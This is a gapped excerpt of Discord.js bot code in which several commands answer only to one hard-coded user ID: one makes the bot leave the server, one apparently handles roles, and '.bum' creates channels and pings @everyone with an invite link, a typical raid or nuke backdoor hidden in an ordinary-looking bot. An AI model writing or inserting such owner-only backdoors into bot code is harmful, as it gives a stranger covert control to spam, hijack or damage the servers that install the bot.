...
client.on('message', (message) => {
  if (message.author.id === '1062306530403303425' && message.content === '.çık') {
    message.guild.leave();
  }
});
...
client.on('messageCreate', message => {
  ...
  if (message.content.startsWith('.rolekle') && message.author.bot === false) {
    ...
    if (message.author.id === '1062306530403303425') {
...
client.on('messageCreate', message => {
  ...
  if (message.content === '.bum' && message.author.id === '1062306530403303425') {
    ...
    message.guild.channels.create(channelNames, { type: 'text' }).then(() => {
      ...
      message.channel.send('@everyone https://discord.gg/mycheck');
    }).catch((error) => {
      console.error(error);
